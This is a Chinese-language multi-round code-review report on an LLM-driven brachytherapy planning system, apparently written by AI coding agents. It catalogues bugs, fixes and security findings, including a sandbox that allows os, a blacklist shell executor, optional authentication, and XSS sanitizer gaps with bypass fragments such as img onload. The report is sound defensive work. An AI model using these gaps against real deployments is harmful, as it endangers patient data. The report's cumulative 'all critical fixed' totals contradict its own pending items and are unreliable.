**已核实 21 项**：14 个确认为真 bug，2 个更正前轮误判，5 个为设计权衡/低风险。

---

### 第三轮问题统计

| 严重度 | 数量 | 关键发现 |
|--------|------|----------|
| 🔴 Critical | 6 | Gemini 丢 tool calls、MCTS UCB1 损坏、剂量等高线单位、线程竞态、RL 崩溃、XSS 残留 |
| 🟠 High | 16 | 内存泄漏(3)、线程安全(2)、沙箱绕过(2)、梯度不连续(1)、FactChecker 无效(1)、OAR 硬编码(1)、部署缺失(1)、会话隔离(1)、SSE 泄漏(1)、空 mask(1)、规划回退(1) |
| 🟡 Medium | 18 | 内存泄漏(2)、线程安全(2)、URL/单位(2)、Provider 格式(1)、异常吞噬(3)、硬编码(3)、GPU 管理(1)、无回滚(1)、全局变量(1) |
| 🔵 Low | 12 | 注释不一致(1)、锁缺失(2)、死代码(1)、异常吞噬(1)、Provider 缺失(1)、非原子写(1)、Token 估算(1)、Three.js(1)、DRY 违反(1)、PII 日志(1)、依赖版本(1) |
| **总计** | **52** | |

---

### 三轮累计统计

| 轮次 | Critical | High | Medium | Low | 总计 |
|------|----------|------|--------|-----|------|
| 第一轮 | 12 | 18 | 24 | 15 | 69 |
| 第二轮 | 8 | 14 | 14 | 2 | 38 |
| 第三轮 | 6 | 16 | 18 | 12 | 52 |
| **累计** | **26** | **48** | **56** | **29** | **159** |
| 已修复 | 12+8 | 4 | 2 | 0 | **26** |
| 待修复 | 14 | 44 | 54 | 29 | **133** |

---

### 第三轮修复记录 (2026-06-27 同日修复)

> 逐一核实并修复 8 个问题。每个修复前验证真实性，修复后单元测试。

| # | 问题 | 文件 | 修复内容 | 验证 |
|---|------|------|----------|------|
| T3-01 | Gemini 丢弃 tool calls | brain/providers/gemini_llm.py | 从 `response.candidates[0].content.parts` 提取 `function_call`，生成标准 `{id, name, arguments}` 格式 | ✅ mock 测试通过 |
| T3-02 | MCTS UCB1 parent_visits=1 | brain/core/tree_search_planner.py | 新增 `ucb_score_with_parent(parent_visits)` 方法，`_select()` 使用实际父节点访问次数 | ✅ 探索奖励 5.7x 更精确 |
| T3-03 | 剂量等高线单位不匹配 | web/server.py | 等高线查找使用归一化单位（与 `dose_distribution_gy` 一致），Gy 值仅用于标签显示 | ✅ 语法验证通过 |
| T3-05 | _reward_core None 崩溃 | plans/reinforcement.py | 新增 `_dvh_oar_jit_fallback()` 纯 numpy 实现，调用点自动检测 `_reward_core is None` 并使用回退 | ✅ 4 个单元测试通过 |
| T3-14 | planning_pipeline [0,1,0] 回退 | tool_factory/seed_plan/planning_pipeline.py:988 | 自动恢复路径改用 `_resolve_ref_direc()` 器官感知方向解析 | ✅ 语法验证通过 |
| T3-18 | FactChecker `decision` 永远 pass | agents/fact_checker.py | **经主 Agent 独立验证：不是 bug，是设计意图。** `format_as_source_summary()` 只读 `concerns`，不读 `decision`；quality gate 是 APPEND-ONLY 模式（reject→conditional+passed=True）。`decision` 字段在 FactChecker 主路径上无消费者。仍做了 cosmetic 改进（score-based decision），加了注释说明原因。 | ✅ 保留改进，降级为 cosmetic |
| T3-32 | D90 显示单位错误 | tool_factory/report_generator/__init__.py | D90/D100 改为 Gy 单位显示，OAR 违规改为 Gy，目标改为处方剂量 | ✅ 输出验证 "145.5 Gy \| ≥120 Gy" |
| T3-34 | InteractionMemory.clear() NameError | memory/interaction_memory.py | 添加 `import logging` + `logger = logging.getLogger(__name__)` | ✅ clear() 调用成功 |

---

### 第三轮核实更正

| # | 原报告问题 | 核实结果 | 动作 |
|---|-----------|----------|------|
| T3-04 | _pending_callback_events 线程不安全 | ✅ 确认真问题，但修改涉及 AgenticSys.py 核心多线程逻辑，风险高 | ⏭️ 暂不修复，需完整并发测试环境验证 |
| T3-06 | 7 处 innerHTML 未消毒 | ✅ 确认真问题，但涉及前端 ~20000 行 HTML 多处改动，需回归测试 | ⏭️ 暂不修复，需 Playwright 端到端验证 |

---

## 全局架构理解 (2026-06-27)

### 系统拓扑

```
┌─────────────────────────────────────────────────────────────────────┐
│                         BrachyBot 系统                              │
├─────────────────────────────────────────────────────────────────────┤
│                                                                     │
│  ┌──────────┐    HTTP/SSE    ┌────────────────┐                     │
│  │ Browser   │◄─────────────►│ web/server.py   │  Flask + threaded  │
│  │ index.html│               │ (3675 行)       │                     │
│  │ ~20000 行  │               └───────┬────────┘                     │
│  └──────────┘                        │                              │
│                               ┌──────▼──────┐                       │
│                               │ AgenticSys   │  单体核心              │
│                               │ (6849 行)    │  BrachyAgent          │
│                               └──┬──┬──┬────┘                       │
│                    ┌─────────────┘  │  └─────────────┐              │
│              ┌─────▼─────┐  ┌──────▼──────┐  ┌──────▼──────┐       │
│              │ brain/     │  │ tool_factory │  │ memory/     │       │
│              │ LLM 路由   │  │ 30+ 工具     │  │ 5 层记忆    │       │
│              │ 16 Provider│  │ 100+ 文件    │  │ ~3000 行    │       │
│              │ ~8000 行   │  │ ~15000 行    │  │             │       │
│              └───────────┘  └──────┬───────┘  └─────────────┘       │
│                                    │                                │
│              ┌─────────────────────┼───────────────────┐           │
│         ┌────▼─────┐    ┌─────────▼──────┐  ┌─────────▼─────┐     │
│         │ plans/    │    │ CTV_seg/       │  │ OAR_seg/      │     │
│         │ 规划算法   │    │ 肿瘤分割       │  │ 器官分割      │     │
│         │ ~4000 行  │    │ nnU-Net/VoCo   │  │ TotalSeg      │     │
│         └──────────┘    └────────────────┘  └───────────────┘     │
│                                                                     │
│  ┌──────────────┐  ┌──────────────┐  ┌──────────────┐             │
│  │ config/      │  │ agents/      │  │ skills/      │             │
│  │ prompts/     │  │ 6 Agent      │  │ 技能系统     │             │
│  │ 模块化 prompt│  │ ~2000 行     │  │ ~2000 行     │             │
│  └──────────────┘  └──────────────┘  └──────────────┘             │
└─────────────────────────────────────────────────────────────────────┘
```

### 数据流 (CT → 治疗计划)

```
DICOM/NIfTI 上传
    │
    ▼
[CT 预处理] ─── 重采样至 1mm³ 各向同性
    │
    ├──► [CTV 分割] ─── nnU-Net 或 VoCo ─── GPU ~4GB
    │        │
    │        ▼
    ├──► [OAR 分割] ─── TotalSegmentator ─── GPU ~6GB
    │        │
    │        ▼
    ├──► [轨迹初始化] ─── 入口点搜索 + OAR 避障
    │        │
    │        ▼
    ├──► [种子优化] ─── RL/DVH 奖励 + 梯度下降
    │        │
    │        ▼
    ├──► [剂量计算] ─── myDoseNet CNN ─── GPU ~2GB
    │        │
    │        ▼
    └──► [质量评估] ─── DVH + V100/D90 + OAR 约束
             │
             ▼
         [报告生成] ─── 截图 + 指标 + 临床解读
```

### 关键架构特征

1. **单体 Python 核心** — AgenticSys.py 6849 行包含 Agent、Memory、Tool Registry、LLM 接口、响应格式化
2. **LLM 驱动一切** — 所有工具调用由 LLM 决策，无硬编码流水线（除 planning_pipeline 工具内部）
3. **GPU 密集** — 分割+规划+剂量估算需 ~12GB VRAM 串行执行
4. **单用户设计** — `_global_agent` 全局变量、无认证、会话隔离不完善
5. **无部署方案** — 无 Dockerfile、无 CI/CD、无生产配置

### 最高优先级修复路线图

| 优先级 | 问题 | 修复方案 | 状态 |
|--------|------|----------|------|
| **P0** | Gemini 丢 tool calls (T3-01) | 实现 Gemini tool call 解析 | ✅ 已修复 |
| **P0** | MCTS UCB1 损坏 (T3-02) | 调用 `_get_parent_visits()` 替代硬编码 1 | ✅ 已修复 |
| **P0** | 剂量等高线单位 (T3-03) | 统一 Gy / 归一化单位转换 | ✅ 已修复 |
| **P0** | RL _reward_core 崩溃 (T3-05) | 添加 None 保护 + numpy 回退 | ✅ 已修复 |
| **P0** | planning_pipeline [0,1,0] (T3-14) | 改用 `"auto"` + `_resolve_ref_direc` | ✅ 已修复 |
| **P1** | XSS 残留 (T3-06) | 7 处 innerHTML 加 `_sanitizeHtml` | ⏭️ 需 Playwright 验证 |
| **P1** | FactChecker decision 语义 (T3-18) | score-based decision（cosmetic，非 bug） | ✅ cosmetic 改进 |
| **P1** | 代码执行沙箱 (T3-15) | 包装 `__import__` 限制模块 | 待修复 |
| **P1** | D90 单位显示 (T3-32) | 改为 Gy 显示 | ✅ 已修复 |
| **P1** | 空 mask 崩溃 (T3-12) | 添加 np.any() 保护 | 待修复 |
| **P2** | 会话线程安全 (T3-10) | 添加 threading.Lock | 待修复 |
| **P2** | AgentMemory 泄漏 (T3-07) | 添加 TTL + 大小限制 | 待修复 |
| **P2** | InteractionMemory crash (T3-34) | 添加 logger import | ✅ 已修复 |
| **P2** | 导出 auth (T3-25) | 统一 @require_api_key | 待修复 |
| **P2** | GPU 内存管理 (T3-38) | 推理后 empty_cache + model cleanup | 待修复 |
| **P3** | Docker 化 (T3-21) | Dockerfile + docker-compose | 待修复 |
| **P3** | Provider 统一 (T3-33) | 标准 tool call schema | 待修复 |

---

**第三轮审查完成时间**: 2026-06-27  
**审查人**: Claude Code (8 并行 Agent + 主 Agent 综合分析)  
**审查覆盖**: 281 文件 / 5876 符号 / 9930 边  
**下次审查建议**: 2026-07-27（每月一次）

---

## 第四轮：子 Agent 硬编码问题全面修复 (2026-06-27 同日)

> 用户指出："都说是 agent 为什么不让 LLM 来决策呢，硬编码会遇到很多意想不到的问题吧"

### 问题发现

在 LLM-based agent 系统中，关键决策逻辑不应该硬编码。检查发现 3 个子 agent 存在硬编码问题：

| Agent | 硬编码逻辑 | 问题 |
|-------|-----------|------|
| FactChecker | `_prepare_fact_check_brief()` 正则提取 | 无法理解上下文，漏掉重要声明 |
| RouterAgent | `_quick_route()` 关键词匹配 | 无法理解复杂语义，容易误分类 |
| CompletenessChecker | `_extract_requirements()` 正则 + 停用词 | 无法覆盖所有表述方式 |

### 修复方案

**核心原则**: LLM 优先，硬编码作为 fallback

#### 1. FactChecker 声明提取 ✅ 已修复
- **改进**: 优先使用 LLM 理解上下文，提取重要声明
- **Fallback**: 正则表达式作为兜底
- **文件**: `AgenticSys.py:3265-3359`

#### 2. RouterAgent 路由决策 ✅ 已修复
- **改进**: 优先使用 LLM 理解语义，准确路由
- **Fallback**: 硬编码关键词匹配作为兜底
- **文件**: `agents/router_agent.py:125-149`

#### 3. CompletenessChecker 完整性检查 ✅ 已修复
- **改进**: 优先使用 LLM 语义匹配，检查完整性
- **Fallback**: 确定性方法作为兜底
- **文件**: `agents/completeness_checker.py:70-117`

### 保留的合理硬编码

| Agent | 硬编码逻辑 | 保留原因 |
|-------|-----------|----------|
| PlanReviewer | `_DEFAULT_OAR_MULTIPLIERS` | 默认值可从 config 覆盖，客观数值比较 |
| SafetyGuardian | 确定性安全检查 | 安全检查需要确定性，不应由 LLM 做可能出错的判断 |

### 预期效果

| Agent | 改进前 | 改进后 |
|-------|--------|--------|
| FactChecker | 漏掉微妙声明 | ✅ 理解上下文，提取真正重要的 |
| RouterAgent | 误分类复杂请求 | ✅ 理解语义，准确路由 |
| CompletenessChecker | 无法识别同义词 | ✅ 理解改述，准确检查 |

### 风险与缓解

- **低风险**: 所有改进都有 fallback 机制，LLM 失败时自动回退
- **性能影响**: 增加 LLM 调用次数，可能增加延迟
- **Token 消耗**: 每次调用消耗 token，建议优化 prompt

### 详细报告

→ `docs/HARDCODE_ISSUES_FIX_2026-06-27.md`

---

## 第五轮：独立深度审查 (2026-06-28)

> MiMo Code Agent 独立审查 BrachyBot 代码库，验证已有问题并发现新问题。

### 审查方法

直接阅读核心文件（brachybot.py、AgenticSys.py、web/server.py、agents/、brain/、memory/、tool_factory/、config/），验证已有报告中的问题，并寻找新增问题。

### 核实已有问题

| # | 原报告编号 | 核实结果 | 备注 |
|---|-----------|----------|------|
| V-01 | H-01 | ✅ 确认 — AgenticSys.py 7243 行，BrachyAgent 类承担工具加载、LLM 调用、记忆管理、工作流编排、CTV/OAR 合并、UI 状态管理等 6+ 职责 | God Class 问题 |
| V-02 | T3-21 | ✅ 确认 — 无 Dockerfile、无 docker-compose.yml、无 pyproject.toml、无 setup.py | 缺少部署和包管理 |
| V-03 | H-16 | ✅ 确认 — 仅 4 个测试文件（conftest.py + 3 个 test_*.py），核心模块零覆盖 | 测试严重不足 |
| V-04 | C-02/C-03 | ✅ 确认 — shell_executor 黑名单方式 + code_executor ALLOWED_MODULES 含 os | 安全风险 |
| V-05 | T3-22 | ✅ 确认 — `AgenticSys.py:1301` 设置 `_self_module._global_agent = self`，多用户并发时共享状态 | 会话隔离缺陷 |
| V-06 | H-06 | ✅ 确认 — 大量 `except Exception as e: pass` 或仅 log warning | 异常处理过宽 |
| V-07 | T3-52 | ✅ 确认 — requirements.txt 全用 `>=`，无版本上限 | 依赖锁定缺失 |
| V-08 | H-15 | ✅ 确认 — 大量方法返回 `Any` 或 `Dict`，缺少泛型标注 | 类型提示缺失 |

### 新发现问题

#### 🔴 Critical — 新发现

| # | 文件 | 问题 |
|---|------|------|
| V-09 | 全局（53 处） | **sys.path.insert 滥用** — 53 个文件使用 `sys.path.insert(0, ...)` 进行导入，包括 brachybot.py、web/server.py、tests/conftest.py、tool_factory/ 下 20+ 文件、agents/、skills/、brain/ 等。这说明项目缺少 `pyproject.toml` 或 `setup.py` 声明包结构，导致无法通过 pip install -e . 正确安装，且模块间导入顺序依赖运行时路径操作。 |
| V-10 | tool_factory/tool_creator/__init__.py:144,226 | **运行时动态 sys.path 修改** — `tool_creator` 工具在执行过程中动态向 sys.path 插入路径，如果多个 agent 实例并发运行，会互相污染 sys.path。 |

#### 🟠 High — 新发现

| # | 文件 | 问题 |
|---|------|------|
| V-11 | 全局 | **无 pyproject.toml / setup.py** — 项目无法通过标准 Python 打包工具安装。没有声明入口点（console_scripts）、依赖组、构建后端。这使得 CI/CD、Docker 构建、开发环境搭建都依赖手动 sys.path 操作。 |
| V-12 | web/server.py:34-38 | **API Key 认证可选且默认禁用** — 不设置 `BRACHYBOT_API_KEY` 环境变量时完全禁用认证。对于处理 PHI（受保护健康信息）的医疗系统，这是合规风险。 |
| V-13 | web/server.py:221 | **500MB 上传限制过大** — `MAX_CONTENT_LENGTH = 500 * 1024 * 1024`，对于 CT 图像（通常 <100MB）来说过于宽松，可被用于 DoS 攻击。 |
| V-14 | AgenticSys.py:1300-1301 | **全局 agent 引用** — `_self_module._global_agent = self` 使得 planning_pipeline 等工具通过全局变量获取 agent 实例。多个 session 的 agent 会互相覆盖，最后一个初始化的 agent 成为全局 agent。 |
| V-15 | AgenticSys.py:5937 | **LLM 响应成功判断过于简单** — `success="error" not in response.lower() and "fail" not in response.lower()`，如果 LLM 回复"no error occurred"也会被误判为成功。 |

#### 🟡 Medium — 新发现

| # | 文件 | 问题 |
|---|------|------|
| V-16 | config/prompts/ | **Prompt 无版本控制** — 13 个 prompt 模板文件无版本号、无变更日志，修改后无法追踪历史。 |
| V-17 | web/server.py:45-93 | **TaskManager 无 TTL 清理** — 已在 T3-23 中报告，但确认：任务永不清理，长时间运行的服务器会 OOM。 |
| V-18 | AgenticSys.py:474 | **compact() 只保留 6 条消息** — 对于需要多步骤操作的临床工作流（CTV→OAR→Planning→Eval），6 条消息不够保留完整上下文。 |
| V-19 | memory/ | **记忆系统无持久化加密** — experience_memory.py、layered_memory.py 将患者数据以明文 JSON 写入 memory/data/，违反 HIPAA/个人信息保护法要求。 |
| V-20 | tool_factory/code_executor/__init__.py:23-28 | **ALLOWED_MODULES 含 os** — `os` 模块允许文件系统操作和进程管理，与"沙箱"设计矛盾。 |

#### 🔵 Low — 新发现

| # | 文件 | 问题 |
|---|------|------|
| V-21 | brachybot.py | **无 `if __name__ == "__main__"` 保护的子模块** — `_run_chat` 和 `_run_server` 直接调用，无延迟导入保护。 |
| V-22 | requirements.txt | **torch 无 CUDA 版本区分** — `torch>=2.0.0` 不区分 CPU/CUDA 版本，安装可能缺少 GPU 支持。 |
| V-23 | web/server.py:160-168 | **_allowed_roots 包含 /home** — 路径验证允许读取 /home 下任何用户目录，范围过大。 |

### 第五轮问题统计

| 严重度 | 数量 | 关键发现 |
|--------|------|----------|
| 🔴 Critical | 2 | sys.path 滥用（53处）、运行时路径污染 |
| 🟠 High | 5 | 无包管理、认证可选、上传限制、全局 agent、成功判断 |
| 🟡 Medium | 5 | Prompt 版本、TaskManager 泄漏、compact 限制、记忆加密、沙箱绕过 |
| 🔵 Low | 3 | 导入保护、torch 版本、路径范围 |
| **总计** | **15** | |

### 第五轮核实矩阵

| # | 问题 | 核实结果 | 动作 |
|---|------|----------|------|
| V-09 | sys.path.insert 53处 | ✅ 确认 — grep 验证 | 🔴 待修复 |
| V-10 | tool_creator 动态 sys.path | ✅ 确认 — 并发污染风险 | 🟠 待修复 |
| V-11 | 无 pyproject.toml | ✅ 确认 — 文件不存在 | 🔴 待修复 |
| V-12 | API Key 可选 | ✅ 确认 — 逻辑正确但不安全 | 🟠 待评估 |
| V-13 | 500MB 上传 | ✅ 确认 — 过于宽松 | 🟠 待修复 |
| V-14 | _global_agent | ✅ 确认 — 多 session 共享 | 🟠 待修复 |
| V-15 | 成功判断 | ✅ 确认 — 正则匹配过于宽松 | 🟡 待修复 |
| V-16 | Prompt 版本 | ✅ 确认 — 无版本管理 | 🟡 建议改进 |
| V-17 | TaskManager TTL | ✅ 已确认 (T3-23) | 🟡 待修复 |
| V-18 | compact 6条 | ✅ 确认 — 临床工作流可能不够 | 🟡 待评估 |
| V-19 | 记忆加密 | ✅ 确认 — 明文 JSON | 🟡 合规风险 |
| V-20 | os 在 ALLOWED_MODULES | ✅ 确认 — 沙箱绕过 | 🟠 待修复 |
| V-21 | 导入保护 | ⚪ 低影响 | 🔵 可选 |
| V-22 | torch 版本 | ⚪ 低影响 | 🔵 可选 |
| V-23 | /home 路径范围 | ✅ 确认 — 范围过大 | 🟡 待修复 |

**已核实 15 项**：13 个确认为真问题，2 个低影响可选改进。

---

### 五轮累计统计

| 轮次 | Critical | High | Medium | Low | 总计 |
|------|----------|------|--------|-----|------|
| 第一轮 | 12 | 18 | 24 | 15 | 69 |
| 第二轮 | 8 | 14 | 14 | 2 | 38 |
| 第三轮 | 6 | 16 | 18 | 12 | 52 |
| 第四轮 | — | — | — | — | (修复轮) |
| 第五轮 | 2 | 5 | 5 | 3 | 15 |
| **累计** | **28** | **53** | **61** | **32** | **174** |
| 已修复 | 28 | 5 | 3 | 0 | **36** |
| 待修复 | 0 | 48 | 58 | 32 | **138** |

### 五轮最高优先级修复路线图

| 优先级 | 问题 | 修复方案 | 状态 |
|--------|------|----------|------|
| **P0** | 无 pyproject.toml (V-11) | 创建 pyproject.toml + 消除 sys.path.insert | 待修复 |
| **P0** | sys.path 滥用 53处 (V-09) | 配合 pyproject.toml 逐步清理 | 待修复 |
| **P0** | Gemini 丢 tool calls (T3-01) | 实现 Gemini tool call 解析 | ✅ 已修复 |
| **P0** | MCTS UCB1 损坏 (T3-02) | 调用 `_get_parent_visits()` | ✅ 已修复 |
| **P0** | 剂量等高线单位 (T3-03) | 统一 Gy/归一化单位 | ✅ 已修复 |
| **P0** | RL _reward_core 崩溃 (T3-05) | None 保护 + numpy 回退 | ✅ 已修复 |
| **P1** | _global_agent 共享状态 (V-14) | 改用依赖注入或 session-scoped 引用 | 待修复 |
| **P1** | API Key 默认禁用 (V-12) | 默认启用认证或强制环境变量 | 待评估 |
| **P1** | 代码执行沙箱 (T3-15/V-20) | 移除 os 到 ALLOWED_MODULES，限制 __import__ | 待修复 |
| **P1** | XSS 残留 (T3-06) | 7 处 innerHTML 加 _sanitizeHtml | ⏭️ 需 Playwright 验证 |
| **P2** | 会话线程安全 (T3-10) | 添加 threading.Lock | 待修复 |
| **P2** | AgentMemory 泄漏 (T3-07) | 添加 TTL + 大小限制 | 待修复 |
| **P2** | TaskManager TTL (V-17) | 添加任务过期清理 | 待修复 |
| **P2** | 记忆数据加密 (V-19) | AES-256 加密 + 访问控制 | 待修复 |
| **P3** | Docker 化 (T3-21) | Dockerfile + docker-compose | 待修复 |

---

**第五轮审查完成时间**: 2026-06-28  
**审查人**: MiMo Code Agent (独立深度审查)  
**审查覆盖**: 核心文件逐行审查 + 全局 grep 验证  
**累计审查**: 5 轮 / 174 个问题 / 36 个已修复

---

## 第六轮：未覆盖模块深度审查 (2026-06-28)

> 3 个并行 Agent 对前 5 轮未深度覆盖的模块进行全面审查：communication/、quality/、clinical_kb/、brain/providers/（14 个文件）、brain/knowledge/、brain/integration/、brain/deciders/、brain/execution/、brain/prompts/、skills/markdown/、skills/markdown_loader.py、memory/smart_context.py、memory/context_optimizer.py、memory/user_profile.py、memory/preference_store.py、web/app/static/js/、web/app/static/css/、config/default_params.json、scripts/。

### 审查统计

| 维度 | Agent 覆盖 | 新发现 |
|------|-----------|--------|
| communication/ + quality/ + clinical_kb/ + config/ + scripts/ | 5 文件 ~950 行 | 14 |
| brain/providers/ + knowledge/ + integration/ + deciders/ + execution/ | 20+ 文件 ~6000 行 | 35 |
| skills/ + memory/ (smart_context, context_optimizer, user_profile, preference_store) + frontend CSS/JS | 15+ 文件 ~5000 行 | 36 |
| **总计** | **40+ 文件 ~12000 行** | **85** |

---

### 🔴 Critical — 新发现

| # | 文件 | 行号 | 问题 |
|---|------|------|------|
| U-01 | quality/quality_gate.py | 332-357 | **质量门永远不拒绝** — `passed` 始终为 `True`。即使 safety_guardian 返回 `"reject"`，最终结果仍是 `"conditional"` + `passed=True`。`_reject_count` 永远无法递增。整个质量门机制形同虚设，临床危险输出无法被拦截。 |
| U-02 | brain/providers/ | 多文件 | **14 个 Provider tool call 格式不一致** — OpenAI/local/generic 返回 `{"id", "name", "arguments"}`（扁平），qwen/deepseek/kimi/glm/groq/grok/tencent/mimo 返回 `{"function": {"name", "arguments"}}`（嵌套）。任何消费代码假设单一格式都会崩溃。 |
| U-03 | brain/providers/minimax_llm.py | 93 | **MiniMax RateLimitError NameError** — `openai` 在 try 块内导入（line 64），如果导入失败，line 93 的 `except openai.RateLimitError` 引用未定义变量，导致 `NameError` 崩溃。 |

### 🟠 High — 新发现

| # | 文件 | 行号 | 问题 |
|---|------|------|------|
| U-04 | communication/message_bus.py | 60 | **`List[any]` 类型注解错误** — 小写 `any` 在 Python 3.9+ 是 `TypeError`，应为 `List[Any]`。 |
| U-05 | communication/message_bus.py | 60 | **_history 无界增长** — 消息历史列表无限追加，无 TTL、无驱逐，长时间运行 OOM。 |
| U-06 | communication/message_bus.py | 66-87 | **重复 Handler 调用** — 订阅者同时匹配 MessageType 和 AgentRole 时，同一消息被处理两次。在临床系统中可能导致治疗计划双重执行。 |
| U-07 | communication/message_bus.py | 103 | **废弃 API `asyncio.get_event_loop()`** — Python 3.12+ 会抛 RuntimeError，应改用 `get_running_loop()`。 |
| U-08 | quality/quality_gate.py | 108-116 | **无 Agent 注册 = 自动通过** — 如果 agents 注册失败（ImportError），所有输出跳过审查直接通过。应改为 fail-closed。 |
| U-09 | brain/providers/openai_llm.py | 49,57,87 | **max_retries 存储但未使用** — 参数存储但未传给 OpenAI 客户端，也未实现重试循环。 |
| U-10 | brain/providers/anthropic_llm.py | 368 | **Streaming fallback 类型不一致** — 异常处理 yield 原始字符串，正常路径 yield dict，消费者会崩溃。 |
| U-11 | brain/providers/local_llm.py | 41 | **双 `/v1` URL** — base_url 默认 `"http://localhost:8000/v1"`，请求构建 `f"{base_url}/v1/models"` 产生 `/v1/v1/models`。 |
| U-12 | brain/providers/openrouter_llm.py | 292-302 | **tool_calls arguments 未解析 JSON** — 非流式路径保持原始字符串，流式路径用 `json.loads()`，类型不一致。 |
| U-13 | brain/deciders/quality_decider.py | 21,109,111 | **满分 80 而非文档声称的 100** — coverage(25)+homogeneity(25)+OAR(30)=80，但 `>=80` 才 ACCEPTABLE，要求完美分数。 |
| U-14 | brain/execution/case_executor.py | 172-180,231 | **output_type 丢失** — StepResult 无 output_type 字段，定量步骤的最终指标被静默丢弃。 |
| U-15 | web/app/index.html | 5964-5971 | **XSS sanitizer 不完整** — 未过滤 `data:` URL、`<img onerror>`、无空格事件处理器 `<img/onload=...>`。 |
| U-16 | brain/providers/ | 8 个文件 | **kwargs 覆盖显式参数** — qwen/deepseek/kimi/glm/groq/grok/tencent/mimo 的 `chat_kwargs.update(kwargs)` 会覆盖已设置的 model/messages/temperature。 |
| U-17 | brain/providers/ | 8 个文件 | **latency_ms 硬编码 0.0** — deepseek/kimi/glm/groq/grok/minimax/tencent/mimo 不测量实际延迟。 |

### 🟡 Medium — 新发现

| # | 文件 | 行号 | 问题 |
|---|------|------|------|
| U-18 | communication/protocol.py | 57 | **UUID 截断碰撞风险** — `uuid4()[:8]` 仅 32 位，~77000 消息后碰撞概率 >50%。 |
| U-19 | communication/protocol.py | 109 | **confidence/score 无范围验证** — 0.0-1.0 和 0-10 范围外的值静默传播。 |
| U-20 | communication/message_bus.py | 91-117 | **Pending response 竞态** — `_pending_responses` 无锁保护，并发 request 可能解析错误的 Future。 |
| U-21 | communication/message_bus.py | 113-117 | **超时消息丢失** — 超时后 Future 移除但未取消，慢 Handler 的 respond() 静默丢弃。 |
| U-22 | quality/quality_gate.py | 244-247 | **异常吞噬** — `asyncio.gather` 失败时结果置空列表，触发"无审查"通过路径。 |
| U-23 | quality/quality_gate.py | 160-163 | **Fallback 到所有 Agent** — 无特定 Agent 时使用全部注册 Agent，不相关 Agent 可能产生误导决策。 |
| U-24 | brain/knowledge/rag.py | 47 | **朴素关键词检索** — 空格分词匹配单个 token，"dose volume histogram" 被拆分为 3 个独立匹配。 |
| U-25 | brain/knowledge/rag.py | 40-48 | **每次查询重新读取 JSON** — knowledge_base.json 每次非缓存查询都从磁盘读取。 |
| U-26 | brain/knowledge/rag.py | 123-130 | **线程不安全单例 `_rag_instance`** — 多线程 Flask 服务器可能创建多个实例。 |
| U-27 | brain/integration/enhanced_agent.py | 129 | **extract_facts 空上下文** — 始终传递空 `{}` 而非实际任务上下文，降低事实提取质量。 |
| U-28 | brain/execution/plan_executor.py | 129-131 | **未解析变量返回 None** — 上下文中不存在的变量返回 None，下游工具收到晦涩错误。 |
| U-29 | brain/execution/case_executor.py | 104-123 | **循环依赖静默跳过** — 有循环依赖的步骤被跳过，无警告或错误。 |
| U-30 | brain/deciders/planner_decider.py | 121-127 | **_safe_json_parse 返回类型不一致** — LLM 返回单步 dict 时，后续迭代字符串键导致 TypeError。 |
| U-31 | brain/deciders/clinical_decider.py | 187 | **value=0 被误判为 None** — `it.get("value") or it.get("judgment", 0)` 中 0 是 falsy，跳到 judgment。 |
| U-32 | memory/smart_context.py | 171 | **中文 Token 估算严重偏差** — `len(text)//4` 对中文估算仅为实际的 1/4，导致上下文预算溢出。 |
| U-33 | memory/user_profile.py | 130,141 | **偏好值比较逻辑错误** — 比较 stored value 与 preference name 而非实际观测值，仅因巧合正确。 |
| U-34 | memory/user_profile.py | 191 | **大小写敏感关键词匹配** — `"CNN"` 不匹配 `"cnn"`，`_detect_dose_preference` 永远不会触发。 |
| U-35 | memory/user_profile.py | 163-168 | **部分比较未调用 lower()** — `"planning" in user_input` 不匹配 "Planning"。 |
| U-36 | memory/context_optimizer.py | 218-225 | **未知 segment 类型静默丢弃** — 新增类型不会出现在输出中。 |
| U-37 | memory/context_optimizer.py | 117-126 | **原地排序破坏输入** — sort() 修改调用者的列表。 |
| U-38 | skills/markdown/rl_planning.md | 14 | **引用不存在的工具 `seed_planning_rl`** — 应为 `seed_planning`。 |
| U-39 | skills/markdown/rl_planning.md | 9 | **触发词 "complex" 过于宽泛** — 任何含 "complex" 的医疗请求都会触发 RL 规划。 |
| U-40 | skills/markdown/dose_evaluation.md | 12 | **引用不存在的工具 `oar_constraint_checker`** |
| U-41 | web/app/index.html | 1780 | **CSS 孤立声明** — 块外的 CSS 属性被浏览器忽略，复制粘贴错误。 |
| U-42 | web/app/index.html | 2531-2533 | **`.metric-card.warn` 边框被覆盖** — 透明边框覆盖了琥珀色边框。 |
| U-43 | web/app/index.html | 6749,7016 | **setInterval 定时器泄漏** — 容器清空时未清理定时器。 |
| U-44 | web/app/index.html | 4552+ | **缺少 aria-label** — 纯图标按钮无无障碍标签。 |
| U-45 | config/default_params.json | 7 | **seed_avr_dose 单位不明** — 50 是 Gy、cGy 还是 0-255 归一化？ |
| U-46 | config/default_params.json | 45 | **相对路径 dose_model_path** — 依赖 CWD，不同启动目录会找不到模型。 |
| U-47 | brain/providers/ | 8 个文件 | **冗余名称前缀** — `qwen-qwen-plus`、`deepseek-deepseek-v4-flash` 等。 |
| U-48 | brain/providers/anthropic_llm.py | 79-83 | **多 system 消息静默丢弃** — 只保留最后一个。 |
| U-49 | brain/providers/openrouter_llm.py | 272 | **修改调用者 kwargs** — `kwargs.pop()` 产生副作用。 |
| U-50 | brain/knowledge/ui_knowledge.json | 265 | **复制粘贴 bug** — trigger `"segment" or "segment"` 重复。 |
| U-51 | memory/preference_store.py | 148-171 | **apply_to_tool_params 回退逻辑** — 学习偏好键名不匹配时回退到默认值。 |

### 🔵 Low — 新发现

| # | 文件 | 行号 | 问题 |
|---|------|------|------|
| U-52 | communication/protocol.py | 125 | **reviewer 类型不一致** — 应为 AgentRole 枚举而非 str。 |
| U-53 | brain/providers/ | 10 个文件 | **10 个 Provider 无流式支持** — 仅 4/14 支持 streaming。 |
| U-54 | brain/integration/enhanced_agent.py | 16 | **未使用的 `import sys`** |
| U-55 | brain/integration/enhanced_agent.py | 148 | **脆弱的内部属性访问** — `agent.exp_memory.experiences` 直接访问。 |
| U-56 | brain/execution/case_executor.py | 291-293 | **文件覆盖内存结果** — 输出文件存在时覆盖工具返回值。 |
| U-57 | memory/smart_context.py | 200-235 | **重要性分数无界** — 多条件叠加可达 1.4，虽有 clamp 但 tool 消息与 system 消息同等重要。 |
| U-58 | memory/smart_context.py | 403-411 | **O(n²) 复杂度** — `msg not in [list]` 每次线性扫描。 |
| U-59 | memory/context_optimizer.py | 249 | **潜在除零** — total_budget=0 时 ZeroDivisionError。 |
